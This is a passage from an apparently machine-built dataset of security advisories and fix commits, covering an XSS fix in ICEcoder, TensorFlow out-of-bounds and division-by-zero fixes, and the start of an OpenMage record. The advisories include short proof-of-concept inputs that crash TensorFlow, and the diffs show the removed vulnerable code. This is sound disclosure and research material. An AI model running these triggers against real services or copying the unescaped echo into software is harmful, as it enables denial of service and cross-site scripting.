parent.ICEcoder.replaceInFile(fileRef, true === parent.ICEcoder.findRegex ? findText : parent.ICEcoder.escapeRegex(findText), \\'<?php if (isset($_GET[\\'replace\\'])) {echo $_GET[\\'replace\\'];}; ?>\\');\\n+        parent.ICEcoder.replaceInFile(fileRef, true === parent.ICEcoder.findRegex ? findText : parent.ICEcoder.escapeRegex(findText), \\'<?php if (isset($_GET[\\'replace\\'])) {echo xssClean($_GET[\\'replace\\'], \\'script\\');}; ?>\\');\\n     };\\n \\n     const replaceInFilesAll = function() {\\n@@ -267,7 +270,7 @@ function phpGrep($q, $path, $base) {\\n         fileRef = spansArray[arrayRef].id.replace(\/\\\\|\/g, \"\/\").replace(\/_perms\/g, \"\");\\n         const rExp = new RegExp(true === parent.ICEcoder.findRegex ? findText : parent.ICEcoder.escapeRegex(findText), \"gi\");\\n         \/\/ TODO: get this working\\n-        newName = spansArray[arrayRef].id.replace(\/\\\\|\/g, \"\/\").replace(\/_perms\/g, \"\").replace(rExp, \"<?php if (isset($_GET[\\'replace\\'])) {echo $_GET[\\'replace\\'];}; ?>\");\\n+        newName = spansArray[arrayRef].id.replace(\/\\\\|\/g, \"\/\").replace(\/_perms\/g, \"\").replace(rExp, \"<?php if (isset($_GET[\\'replace\\'])) {echo xssClean($_GET[\\'replace\\'], \\'script\\');}; ?>\");\\n         parent.ICEcoder.renameFile(fileRef,newName);\\n     };'}}",
            "message_norm":"xss and usage fixes on multiple-results.php",
            "language":"en",
            "entities":"[('xss', 'SECWORD', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['lib\/multiple-results.php'])",
            "num_files":1.0,
            "patch_content":"From 21d6ae0f2a3fce7d076ae430d48f5df56bd0f256 Mon Sep 17 00:00:00 2001\nFrom: mattpass <matt@helical-levity.com>\nDate: Fri, 25 Jun 2021 21:22:25 +0100\nSubject: [PATCH] XSS and usage fixes on multiple-results.php\n\n---\n lib\/multiple-results.php | 27 +++++++++++++++------------\n 1 file changed, 15 insertions(+), 12 deletions(-)\n\ndiff --git a\/lib\/multiple-results.php b\/lib\/multiple-results.php\nindex 9e15f00c..00fe5829 100644\n--- a\/lib\/multiple-results.php\n+++ b\/lib\/multiple-results.php\n@@ -1,4 +1,5 @@\n <?php\n+\/\/ TODO: The whole file needs a refactor and comments!\n include \"headers.php\";\n include \"settings.php\";\n $t = $text['multiple-results'];\n@@ -101,16 +102,18 @@\n             if (\n                 \/\/ TODO: Find in filenames not working with regex, see all instances of findText and $findText below\n                 true === haveMatch && -1 < targetURL.indexOf('_perms')) {\n-                if (-1 < userTarget.indexOf(\"selected\")) {\n-                    for (let j = 0; j < parent.ICEcoder.selectedFiles.length; j++) {\n-                        \/\/ TODO: This whole file needs comments - what does the below do?!\n+                    if (-1 < userTarget.indexOf(\"selected\")) {\n+                        for (let j = 0; j < parent.ICEcoder.selectedFiles.length; j++) {\n                         if (\n-                            0 === targetURL.replace(\/\\\/\/g, \"|\").indexOf(parent.ICEcoder.selectedFiles[j].replace(\/\\\/\/g, \"|\").replace(\/_perms\/g, \"\"))\n+                            \/\/ If the pipe delimited targetURL starts with this pipe delimited, non _perms elem selectedFile\n+                            0 === targetURL.replace(\/\\\/\/g, \"|\").indexOf(parent.ICEcoder.selectedFiles[j].replace(\/\\\/\/g, \"|\").replace(\/_perms\/g, \"\").toLowerCase())\n                             && (\n-                            targetURL.replace(\/\\|\/g, \"\/\").replace(\/_perms\/g, \"\") === parent.ICEcoder.selectedFiles[j].replace(\/\\|\/g, \"\/\").replace(\/_perms\/g, \"\")\n+                            \/\/ If the slash delimited, non _perms elem matches the slasj delimited, non _perms elem\n+                            targetURL.replace(\/\\|\/g, \"\/\").replace(\/_perms\/g, \"\") === parent.ICEcoder.selectedFiles[j].replace(\/\\|\/g, \"\/\").replace(\/_perms\/g, \"\").toLowerCase()\n                             ||\n+                            \/\/ Path length for targetURL is greater than path length for this selectedFile and targetURL char at selectedFiles length ends with a slash\n                             (targetURL.replace(\/\\|\/g, \"\/\").split(\"\/\").length > parent.ICEcoder.selectedFiles[j].replace(\/\\|\/g, \"\/\").split(\"\/\").length && \"\/\" === targetURL.charAt(parent.ICEcoder.selectedFiles[j].length)))) {\n-                            foundInSelected = true;\n+                                foundInSelected = true;\n                         }\n                     }\n                 }\n@@ -124,8 +127,8 @@\n                     \/\/ TODO: get this line working\n                     resultsDisplay +=\n                         targetURL.replace(\/\\|\/g, \"\/\").replace(\/_perms\/g, \"\").replace(\/<?php\n-                            echo str_replace(\"\/\", \"\\\/\",strtolower($findText)); ?>\/g, \"<b>\" +\n-                            findText.toLowerCase() + \"<\/b>\");\n+                            echo str_replace(\"\/\", \"\\\/\",strtolower(preg_quote($findText))); ?>\/g, \"<b>\" +\n+                            parent.ICEcoder.xssClean(findText).toLowerCase() + \"<\/b>\");\n                         resultsDisplay += '<\/a><br>';\n                     <?php if (false === isset($_GET['replace'])) { ?>\n                     resultsDisplay += '<div id=\"foundCount' + i +'\">' + spansArray[i].innerHTML + '<\/div>';\n@@ -134,8 +137,8 @@\n                     resultsDisplay +=\n                         '<div id=\"foundCount' + i + '\">' + spansArray[i].innerHTML +\n                         ', <?php echo $t['rename to'];?> ' +\n-                        targetURL.replace(\/\\|\/g, \"\/\").replace(\/_perms\/g, \"\").replace(\/<?php echo str_replace(\"\/\", \"\\\/\",strtolower($findText)); ?>\/g,\"<b><?php\n-                            if (isset($_GET['replace'])) {echo $_GET['replace'];};\n+                        targetURL.replace(\/\\|\/g, \"\/\").replace(\/_perms\/g, \"\").replace(\/<?php echo str_replace(\"\/\", \"\\\/\",strtolower(preg_quote($findText))); ?>\/g,\"<b><?php\n+                            if (isset($_GET['replace'])) {echo str_replace(\"&amp;\", \"&\", xssClean($_GET['replace'], 'script'));};\n                         ?><\/b>\")+'<\/div>';\n                         <?php\n                         ;};\n@@ -253,7 +256,7 @@ function phpGrep($q, $path, $base) {\n \n     const replaceInFileSingle = function(fileRef) {\n         \/\/ TODO: findText in this line\n-        parent.ICEcoder.replaceInFile(fileRef, true === parent.ICEcoder.findRegex ? findText : parent.ICEcoder.escapeRegex(findText), '<?php if (isset($_GET['replace'])) {echo $_GET['replace'];}; ?>');\n+        parent.ICEcoder.replaceInFile(fileRef, true === parent.ICEcoder.findRegex ? findText : parent.ICEcoder.escapeRegex(findText), '<?php if (isset($_GET['replace'])) {echo xssClean($_GET['replace'], 'script');}; ?>');\n     };\n \n     const replaceInFilesAll = function() {\n@@ -267,7 +270,7 @@ function phpGrep($q, $path, $base) {\n         fileRef = spansArray[arrayRef].id.replace(\/\\|\/g, \"\/\").replace(\/_perms\/g, \"\");\n         const rExp = new RegExp(true === parent.ICEcoder.findRegex ? findText : parent.ICEcoder.escapeRegex(findText), \"gi\");\n         \/\/ TODO: get this working\n-        newName = spansArray[arrayRef].id.replace(\/\\|\/g, \"\/\").replace(\/_perms\/g, \"\").replace(rExp, \"<?php if (isset($_GET['replace'])) {echo $_GET['replace'];}; ?>\");\n+        newName = spansArray[arrayRef].id.replace(\/\\|\/g, \"\/\").replace(\/_perms\/g, \"\").replace(rExp, \"<?php if (isset($_GET['replace'])) {echo xssClean($_GET['replace'], 'script');}; ?>\");\n         parent.ICEcoder.renameFile(fileRef,newName);\n     };",
            "code_diff":"@@ -1,4 +1,5 @@\n <?php\n+\/\/ TODO: The whole file needs a refactor and comments!\n include \"headers.php\";\n include \"settings.php\";\n $t = $text['multiple-results'];\n@@ -101,16 +102,18 @@\n             if (\n                 \/\/ TODO: Find in filenames not working with regex, see all instances of findText and $findText below\n                 true === haveMatch && -1 < targetURL.indexOf('_perms')) {\n-                if (-1 < userTarget.indexOf(\"selected\")) {\n-                    for (let j = 0; j < parent.ICEcoder.selectedFiles.length; j++) {\n-                        \/\/ TODO: This whole file needs comments - what does the below do?!\n+                    if (-1 < userTarget.indexOf(\"selected\")) {\n+                        for (let j = 0; j < parent.ICEcoder.selectedFiles.length; j++) {\n                         if (\n-                            0 === targetURL.replace(\/\\\/\/g, \"|\").indexOf(parent.ICEcoder.selectedFiles[j].replace(\/\\\/\/g, \"|\").replace(\/_perms\/g, \"\"))\n+                            \/\/ If the pipe delimited targetURL starts with this pipe delimited, non _perms elem selectedFile\n+                            0 === targetURL.replace(\/\\\/\/g, \"|\").indexOf(parent.ICEcoder.selectedFiles[j].replace(\/\\\/\/g, \"|\").replace(\/_perms\/g, \"\").toLowerCase())\n                             && (\n-                            targetURL.replace(\/\\|\/g, \"\/\").replace(\/_perms\/g, \"\") === parent.ICEcoder.selectedFiles[j].replace(\/\\|\/g, \"\/\").replace(\/_perms\/g, \"\")\n+                            \/\/ If the slash delimited, non _perms elem matches the slasj delimited, non _perms elem\n+                            targetURL.replace(\/\\|\/g, \"\/\").replace(\/_perms\/g, \"\") === parent.ICEcoder.selectedFiles[j].replace(\/\\|\/g, \"\/\").replace(\/_perms\/g, \"\").toLowerCase()\n                             ||\n+                            \/\/ Path length for targetURL is greater than path length for this selectedFile and targetURL char at selectedFiles length ends with a slash\n                             (targetURL.replace(\/\\|\/g, \"\/\").split(\"\/\").length > parent.ICEcoder.selectedFiles[j].replace(\/\\|\/g, \"\/\").split(\"\/\").length && \"\/\" === targetURL.charAt(parent.ICEcoder.selectedFiles[j].length)))) {\n-                            foundInSelected = true;\n+                                foundInSelected = true;\n                         }\n                     }\n                 }\n@@ -124,8 +127,8 @@\n                     \/\/ TODO: get this line working\n                     resultsDisplay +=\n                         targetURL.replace(\/\\|\/g, \"\/\").replace(\/_perms\/g, \"\").replace(\/<?php\n-                            echo str_replace(\"\/\", \"\\\/\",strtolower($findText)); ?>\/g, \"<b>\" +\n-                            findText.toLowerCase() + \"<\/b>\");\n+                            echo str_replace(\"\/\", \"\\\/\",strtolower(preg_quote($findText))); ?>\/g, \"<b>\" +\n+                            parent.ICEcoder.xssClean(findText).toLowerCase() + \"<\/b>\");\n                         resultsDisplay += '<\/a><br>';\n                     <?php if (false === isset($_GET['replace'])) { ?>\n                     resultsDisplay += '<div id=\"foundCount' + i +'\">' + spansArray[i].innerHTML + '<\/div>';\n@@ -134,8 +137,8 @@\n                     resultsDisplay +=\n                         '<div id=\"foundCount' + i + '\">' + spansArray[i].innerHTML +\n                         ', <?php echo $t['rename to'];?> ' +\n-                        targetURL.replace(\/\\|\/g, \"\/\").replace(\/_perms\/g, \"\").replace(\/<?php echo str_replace(\"\/\", \"\\\/\",strtolower($findText)); ?>\/g,\"<b><?php\n-                            if (isset($_GET['replace'])) {echo $_GET['replace'];};\n+                        targetURL.replace(\/\\|\/g, \"\/\").replace(\/_perms\/g, \"\").replace(\/<?php echo str_replace(\"\/\", \"\\\/\",strtolower(preg_quote($findText))); ?>\/g,\"<b><?php\n+                            if (isset($_GET['replace'])) {echo str_replace(\"&amp;\", \"&\", xssClean($_GET['replace'], 'script'));};\n                         ?><\/b>\")+'<\/div>';\n                         <?php\n                         ;};\n@@ -253,7 +256,7 @@ function phpGrep($q, $path, $base) {\n \n     const replaceInFileSingle = function(fileRef) {\n         \/\/ TODO: findText in this line\n-        parent.ICEcoder.replaceInFile(fileRef, true === parent.ICEcoder.findRegex ? findText : parent.ICEcoder.escapeRegex(findText), '<?php if (isset($_GET['replace'])) {echo $_GET['replace'];}; ?>');\n+        parent.ICEcoder.replaceInFile(fileRef, true === parent.ICEcoder.findRegex ? findText : parent.ICEcoder.escapeRegex(findText), '<?php if (isset($_GET['replace'])) {echo xssClean($_GET['replace'], 'script');}; ?>');\n     };\n \n     const replaceInFilesAll = function() {\n@@ -267,7 +270,7 @@ function phpGrep($q, $path, $base) {\n         fileRef = spansArray[arrayRef].id.replace(\/\\|\/g, \"\/\").replace(\/_perms\/g, \"\");\n         const rExp = new RegExp(true === parent.ICEcoder.findRegex ? findText : parent.ICEcoder.escapeRegex(findText), \"gi\");\n         \/\/ TODO: get this working\n-        newName = spansArray[arrayRef].id.replace(\/\\|\/g, \"\/\").replace(\/_perms\/g, \"\").replace(rExp, \"<?php if (isset($_GET['replace'])) {echo $_GET['replace'];}; ?>\");\n+        newName = spansArray[arrayRef].id.replace(\/\\|\/g, \"\/\").replace(\/_perms\/g, \"\").replace(rExp, \"<?php if (isset($_GET['replace'])) {echo xssClean($_GET['replace'], 'script');}; ?>\");\n         parent.ICEcoder.renameFile(fileRef,newName);\n     };"
        },
        {
            "index":260,
            "vuln_id":"GHSA-rg3m-hqc5-344v",
            "cwe_id":"{'CWE-125'}",
            "score":7.1,
            "chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/67bfd9feeecfb3c61d80f0e46d89c170fbee682b'}",
            "dataset":"osv",
            "summary":"`SparseFillEmptyRows` heap OOB ### Impact\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/e71b86d47f8bc1816bf54d7bddc4170e47670b97\/tensorflow\/core\/kernels\/sparse_fill_empty_rows_op.cc#L194-L241) of `SparseFillEmptyRows` can be made to trigger a heap OOB access:\n\n```python\nimport tensorflow as tf\n  \ndata=tf.raw_ops.SparseFillEmptyRows(\n  indices=[[0,0],[0,0],[0,0]],\n  values=['sssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss'],\n  dense_shape=[5,3],\n  default_value='o')\n```\n  \nThis occurs whenever the size of `indices` does not match the size of `values`.\n\n### Patches\nWe have patched the issue in GitHub commit [67bfd9feeecfb3c61d80f0e46d89c170fbee682b](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/67bfd9feeecfb3c61d80f0e46d89c170fbee682b).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
            "published_date":"2021-11-10",
            "chain_len":1,
            "project":"https:\/\/github.com\/tensorflow\/tensorflow",
            "commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/67bfd9feeecfb3c61d80f0e46d89c170fbee682b",
            "commit_sha":"67bfd9feeecfb3c61d80f0e46d89c170fbee682b",
            "patch":"SINGLE",
            "chain_ord":"['67bfd9feeecfb3c61d80f0e46d89c170fbee682b']",
            "before_first_fix_commit":"{'421fba8888bb8f8724bc2e35ca2fdcde16e1bfe5'}",
            "last_fix_commit":"67bfd9feeecfb3c61d80f0e46d89c170fbee682b",
            "chain_ord_pos":1.0,
            "commit_datetime":"09\/30\/2021, 17:44:33",
            "message":"Make SparseFillEmptyRows validate that the length of `values` must be equal to the number of index tuples.\n\nPiperOrigin-RevId: 399969549\nChange-Id: I3c2f2ca1c1d2cc88bb5951c6958b38c16e9436c8",
            "author":"Penporn Koanantakool",
            "comments":null,
            "stats":"{'additions': 8, 'deletions': 0, 'total': 8}",
            "files":"{'tensorflow\/core\/kernels\/sparse_fill_empty_rows_op.cc': {'additions': 8, 'deletions': 0, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/67bfd9feeecfb3c61d80f0e46d89c170fbee682b\/tensorflow%2Fcore%2Fkernels%2Fsparse_fill_empty_rows_op.cc', 'patch': '@@ -24,11 +24,13 @@ limitations under the License.\\n #include <vector>\\n \\n #include \"tensorflow\/core\/framework\/op_kernel.h\"\\n+#include \"tensorflow\/core\/framework\/op_requires.h\"\\n #include \"tensorflow\/core\/framework\/register_types.h\"\\n #include \"tensorflow\/core\/framework\/tensor.h\"\\n #include \"tensorflow\/core\/framework\/tensor_util.h\"\\n #include \"tensorflow\/core\/framework\/types.h\"\\n #include \"tensorflow\/core\/lib\/gtl\/inlined_vector.h\"\\n+#include \"tensorflow\/core\/platform\/errors.h\"\\n #include \"tensorflow\/core\/util\/sparse\/sparse_tensor.h\"\\n \\n namespace tensorflow {\\n@@ -222,6 +224,12 @@ void SparseFillEmptyRowsOpImpl(OpKernelContext* context,\\n                     errors::InvalidArgument(\"values must be a vector, saw: \",\\n                                             values_t.shape().DebugString()),\\n                     done);\\n+  OP_REQUIRES_ASYNC(\\n+      context, indices_t.dim_size(0) == values_t.dim_size(0),\\n+      errors::InvalidArgument(\"The length of `values` (\", values_t.dim_size(0),\\n+                              \") must match the first dimension of `indices` (\",\\n+                              indices_t.dim_size(0), \").\"),\\n+      done);\\n   OP_REQUIRES_ASYNC(\\n       context, TensorShapeUtils::IsScalar(default_value_t.shape()),\\n       errors::InvalidArgument(\"default_value must be a scalar, saw: \",'}}",
            "message_norm":"make sparsefillemptyrows validate that the length of `values` must be equal to the number of index tuples.\n\npiperorigin-revid: 399969549\nchange-id: i3c2f2ca1c1d2cc88bb5951c6958b38c16e9436c8",
            "language":"en",
            "entities":"[('validate', 'ACTION', ''), ('399969549', 'SHA', 'generic_sha')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['tensorflow\/core\/kernels\/sparse_fill_empty_rows_op.cc'])",
            "num_files":1.0,
            "patch_content":"From 67bfd9feeecfb3c61d80f0e46d89c170fbee682b Mon Sep 17 00:00:00 2001\nFrom: Penporn Koanantakool <penporn@google.com>\nDate: Thu, 30 Sep 2021 10:44:33 -0700\nSubject: [PATCH] Make SparseFillEmptyRows validate that the length of `values`\n must be equal to the number of index tuples.\n\nPiperOrigin-RevId: 399969549\nChange-Id: I3c2f2ca1c1d2cc88bb5951c6958b38c16e9436c8\n---\n tensorflow\/core\/kernels\/sparse_fill_empty_rows_op.cc | 8 ++++++++\n 1 file changed, 8 insertions(+)\n\ndiff --git a\/tensorflow\/core\/kernels\/sparse_fill_empty_rows_op.cc b\/tensorflow\/core\/kernels\/sparse_fill_empty_rows_op.cc\nindex e0c7e18090b66d..59eb6076ed528b 100644\n--- a\/tensorflow\/core\/kernels\/sparse_fill_empty_rows_op.cc\n+++ b\/tensorflow\/core\/kernels\/sparse_fill_empty_rows_op.cc\n@@ -24,11 +24,13 @@ limitations under the License.\n #include <vector>\n \n #include \"tensorflow\/core\/framework\/op_kernel.h\"\n+#include \"tensorflow\/core\/framework\/op_requires.h\"\n #include \"tensorflow\/core\/framework\/register_types.h\"\n #include \"tensorflow\/core\/framework\/tensor.h\"\n #include \"tensorflow\/core\/framework\/tensor_util.h\"\n #include \"tensorflow\/core\/framework\/types.h\"\n #include \"tensorflow\/core\/lib\/gtl\/inlined_vector.h\"\n+#include \"tensorflow\/core\/platform\/errors.h\"\n #include \"tensorflow\/core\/util\/sparse\/sparse_tensor.h\"\n \n namespace tensorflow {\n@@ -222,6 +224,12 @@ void SparseFillEmptyRowsOpImpl(OpKernelContext* context,\n                     errors::InvalidArgument(\"values must be a vector, saw: \",\n                                             values_t.shape().DebugString()),\n                     done);\n+  OP_REQUIRES_ASYNC(\n+      context, indices_t.dim_size(0) == values_t.dim_size(0),\n+      errors::InvalidArgument(\"The length of `values` (\", values_t.dim_size(0),\n+                              \") must match the first dimension of `indices` (\",\n+                              indices_t.dim_size(0), \").\"),\n+      done);\n   OP_REQUIRES_ASYNC(\n       context, TensorShapeUtils::IsScalar(default_value_t.shape()),\n       errors::InvalidArgument(\"default_value must be a scalar, saw: \",",
            "code_diff":"@@ -24,11 +24,13 @@ limitations under the License.\n #include <vector>\n \n #include \"tensorflow\/core\/framework\/op_kernel.h\"\n+#include \"tensorflow\/core\/framework\/op_requires.h\"\n #include \"tensorflow\/core\/framework\/register_types.h\"\n #include \"tensorflow\/core\/framework\/tensor.h\"\n #include \"tensorflow\/core\/framework\/tensor_util.h\"\n #include \"tensorflow\/core\/framework\/types.h\"\n #include \"tensorflow\/core\/lib\/gtl\/inlined_vector.h\"\n+#include \"tensorflow\/core\/platform\/errors.h\"\n #include \"tensorflow\/core\/util\/sparse\/sparse_tensor.h\"\n \n namespace tensorflow {\n@@ -222,6 +224,12 @@ void SparseFillEmptyRowsOpImpl(OpKernelContext* context,\n                     errors::InvalidArgument(\"values must be a vector, saw: \",\n                                             values_t.shape().DebugString()),\n                     done);\n+  OP_REQUIRES_ASYNC(\n+      context, indices_t.dim_size(0) == values_t.dim_size(0),\n+      errors::InvalidArgument(\"The length of `values` (\", values_t.dim_size(0),\n+                              \") must match the first dimension of `indices` (\",\n+                              indices_t.dim_size(0), \").\"),\n+      done);\n   OP_REQUIRES_ASYNC(\n       context, TensorShapeUtils::IsScalar(default_value_t.shape()),\n       errors::InvalidArgument(\"default_value must be a scalar, saw: \","
        },
        {
            "index":859,
            "vuln_id":"GHSA-772p-x54p-hjrv",
            "cwe_id":"{'CWE-369'}",
            "score":2.5,
            "chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/799f835a3dfa00a4d852defa29b15841eea9d64f'}",
            "dataset":"osv",
            "summary":"Division by zero in `Conv3D` ### Impact\nA malicious user could trigger a division by 0 in `Conv3D` implementation:\n\n```python\nimport tensorflow as tf\n\ninput_tensor = tf.constant([], shape=[0, 0, 0, 0, 0], dtype=tf.float32)\nfilter_tensor = tf.constant([], shape=[0, 0, 0, 0, 0], dtype=tf.float32)\n\ntf.raw_ops.Conv3D(input=input_tensor, filter=filter_tensor, strides=[1, 56, 56, 56, 1], padding='VALID', data_format='NDHWC', dilations=[1, 1, 1, 23, 1])\n```\n\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/42033603003965bffac51ae171b51801565e002d\/tensorflow\/core\/kernels\/conv_ops_3d.cc#L143-L145) does a modulo operation based on user controlled input:\n\n```cc\n  const int64 out_depth = filter.dim_size(4);\n  OP_REQUIRES(context, in_depth % filter_depth == 0, ...);\n```\n\nThus, when `filter` has a 0 as the fifth element, this results in a division by 0.\n\nAdditionally, if the shape of the two tensors is not valid, an Eigen assertion can be triggered, resulting in a program crash:\n\n```python\nimport tensorflow as tf\n\ninput_tensor = tf.constant([], shape=[2, 2, 2, 2, 0], dtype=tf.float32)\nfilter_tensor = tf.constant([], shape=[0, 0, 2, 6, 2], dtype=tf.float32)\n\ntf.raw_ops.Conv3D(input=input_tensor, filter=filter_tensor, strides=[1, 56, 39, 34, 1], padding='VALID', data_format='NDHWC', dilations=[1, 1, 1, 1, 1])\n```\n\nThe shape of the two tensors must follow the constraints specified in the [op description](https:\/\/www.tensorflow.org\/api_docs\/python\/tf\/raw_ops\/Conv3D).\n\n### Patches\nWe have patched the issue in GitHub commit [799f835a3dfa00a4d852defa29b15841eea9d64f](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/799f835a3dfa00a4d852defa29b15841eea9d64f).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",
            "published_date":"2021-05-21",
            "chain_len":1,
            "project":"https:\/\/github.com\/tensorflow\/tensorflow",
            "commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/799f835a3dfa00a4d852defa29b15841eea9d64f",
            "commit_sha":"799f835a3dfa00a4d852defa29b15841eea9d64f",
            "patch":"SINGLE",
            "chain_ord":"['799f835a3dfa00a4d852defa29b15841eea9d64f']",
            "before_first_fix_commit":"{'42033603003965bffac51ae171b51801565e002d'}",
            "last_fix_commit":"799f835a3dfa00a4d852defa29b15841eea9d64f",
            "chain_ord_pos":1.0,
            "commit_datetime":"04\/19\/2021, 16:56:46",
            "message":"Fix 2 issues with `Conv3D`.\n\nWe have an issue where the dimensions are not matching and this causes Eigen to crash on an assert.\n\nThen, we have an issue where we accidentally do a division by 0.\n\nPiperOrigin-RevId: 369242785\nChange-Id: Ie94067b2d41f58699af99ebb5af335ad9defd931",
            "author":"Mihai Maruseac",
            "comments":null,
            "stats":"{'additions': 7, 'deletions': 0, 'total': 7}",
            "files":"{'tensorflow\/core\/kernels\/conv_ops_3d.cc': {'additions': 7, 'deletions': 0, 'changes': 7, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/799f835a3dfa00a4d852defa29b15841eea9d64f\/tensorflow%2Fcore%2Fkernels%2Fconv_ops_3d.cc', 'patch': '@@ -69,6 +69,11 @@ struct LaunchConvOp<CPUDevice, T> {\\n                 errors::InvalidArgument(\"CPU implementation of Conv3D \"\\n                                         \"currently only supports dilated rates \"\\n                                         \"of 1.\"));\\n+    OP_REQUIRES(context, filter.dim_size(3) == input.dim_size(input.dims() - 1),\\n+                errors::InvalidArgument(\\n+                    \"Number of channels in filter (\", filter.dim_size(3),\\n+                    \") must match last dimension of input (\",\\n+                    input.dim_size(input.dims() - 1), \")\"));\\n     functor::CuboidConvolution<CPUDevice, T>()(\\n         context->eigen_device<CPUDevice>(), output->tensor<T, 5>(),\\n         input.tensor<T, 5>(), filter.tensor<T, 5>(), strides[2], strides[1],\\n@@ -142,6 +147,8 @@ class Conv3DOp : public BinaryOp<T> {\\n     const int64 filter_depth = filter.dim_size(3);\\n     const int64 out_depth = filter.dim_size(4);\\n \\n+    OP_REQUIRES(context, filter_depth != 0,\\n+                errors::InvalidArgument(\"filter_depth must be non-zero\"));\\n     OP_REQUIRES(context, in_depth % filter_depth == 0,\\n                 errors::InvalidArgument(\\n                     \"Input depth must be evenly divisible by filter depth: \",'}}",
            "message_norm":"fix 2 issues with `conv3d`.\n\nwe have an issue where the dimensions are not matching and this causes eigen to crash on an assert.\n\nthen, we have an issue where we accidentally do a division by 0.\n\npiperorigin-revid: 369242785\nchange-id: ie94067b2d41f58699af99ebb5af335ad9defd931",
            "language":"en",
            "entities":"[('fix', 'ACTION', ''), ('issues', 'FLAW', ''), ('issue', 'FLAW', ''), ('issue', 'FLAW', ''), ('division by 0', 'SECWORD', ''), ('369242785', 'SHA', 'generic_sha')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['tensorflow\/core\/kernels\/conv_ops_3d.cc'])",
            "num_files":1.0,
            "patch_content":"From 799f835a3dfa00a4d852defa29b15841eea9d64f Mon Sep 17 00:00:00 2001\nFrom: Mihai Maruseac <mihaimaruseac@google.com>\nDate: Mon, 19 Apr 2021 09:56:46 -0700\nSubject: [PATCH] Fix 2 issues with `Conv3D`.\n\nWe have an issue where the dimensions are not matching and this causes Eigen to crash on an assert.\n\nThen, we have an issue where we accidentally do a division by 0.\n\nPiperOrigin-RevId: 369242785\nChange-Id: Ie94067b2d41f58699af99ebb5af335ad9defd931\n---\n tensorflow\/core\/kernels\/conv_ops_3d.cc | 7 +++++++\n 1 file changed, 7 insertions(+)\n\ndiff --git a\/tensorflow\/core\/kernels\/conv_ops_3d.cc b\/tensorflow\/core\/kernels\/conv_ops_3d.cc\nindex 56b58b58daa185..505c55c7e6feaa 100644\n--- a\/tensorflow\/core\/kernels\/conv_ops_3d.cc\n+++ b\/tensorflow\/core\/kernels\/conv_ops_3d.cc\n@@ -69,6 +69,11 @@ struct LaunchConvOp<CPUDevice, T> {\n                 errors::InvalidArgument(\"CPU implementation of Conv3D \"\n                                         \"currently only supports dilated rates \"\n                                         \"of 1.\"));\n+    OP_REQUIRES(context, filter.dim_size(3) == input.dim_size(input.dims() - 1),\n+                errors::InvalidArgument(\n+                    \"Number of channels in filter (\", filter.dim_size(3),\n+                    \") must match last dimension of input (\",\n+                    input.dim_size(input.dims() - 1), \")\"));\n     functor::CuboidConvolution<CPUDevice, T>()(\n         context->eigen_device<CPUDevice>(), output->tensor<T, 5>(),\n         input.tensor<T, 5>(), filter.tensor<T, 5>(), strides[2], strides[1],\n@@ -142,6 +147,8 @@ class Conv3DOp : public BinaryOp<T> {\n     const int64 filter_depth = filter.dim_size(3);\n     const int64 out_depth = filter.dim_size(4);\n \n+    OP_REQUIRES(context, filter_depth != 0,\n+                errors::InvalidArgument(\"filter_depth must be non-zero\"));\n     OP_REQUIRES(context, in_depth % filter_depth == 0,\n                 errors::InvalidArgument(\n                     \"Input depth must be evenly divisible by filter depth: \",",
            "code_diff":"@@ -69,6 +69,11 @@ struct LaunchConvOp<CPUDevice, T> {\n                 errors::InvalidArgument(\"CPU implementation of Conv3D \"\n                                         \"currently only supports dilated rates \"\n                                         \"of 1.\"));\n+    OP_REQUIRES(context, filter.dim_size(3) == input.dim_size(input.dims() - 1),\n+                errors::InvalidArgument(\n+                    \"Number of channels in filter (\", filter.dim_size(3),\n+                    \") must match last dimension of input (\",\n+                    input.dim_size(input.dims() - 1), \")\"));\n     functor::CuboidConvolution<CPUDevice, T>()(\n         context->eigen_device<CPUDevice>(), output->tensor<T, 5>(),\n         input.tensor<T, 5>(), filter.tensor<T, 5>(), strides[2], strides[1],\n@@ -142,6 +147,8 @@ class Conv3DOp : public BinaryOp<T> {\n     const int64 filter_depth = filter.dim_size(3);\n     const int64 out_depth = filter.dim_size(4);\n \n+    OP_REQUIRES(context, filter_depth != 0,\n+                errors::InvalidArgument(\"filter_depth must be non-zero\"));\n     OP_REQUIRES(context, in_depth % filter_depth == 0,\n                 errors::InvalidArgument(\n                     \"Input depth must be evenly divisible by filter depth: \","
        },
        {
            "index":82,
            "vuln_id":"GHSA-26rr-v2j2-25fh",
            "cwe_id":"{'CWE-91'}",
            "score":0.0,
            "chain":"{'https:\/\/github.com\/OpenMage\/magento-lts\/commit\/b99307d00b59c4a226a1e3e4083f02cf2fc8fce7'}",
            "dataset":"osv",
            "summary":"Layout XML Arbitrary Code Fix  ### Impact\nLayout XML enabled admin users to execute arbitrary commands via block methods.",
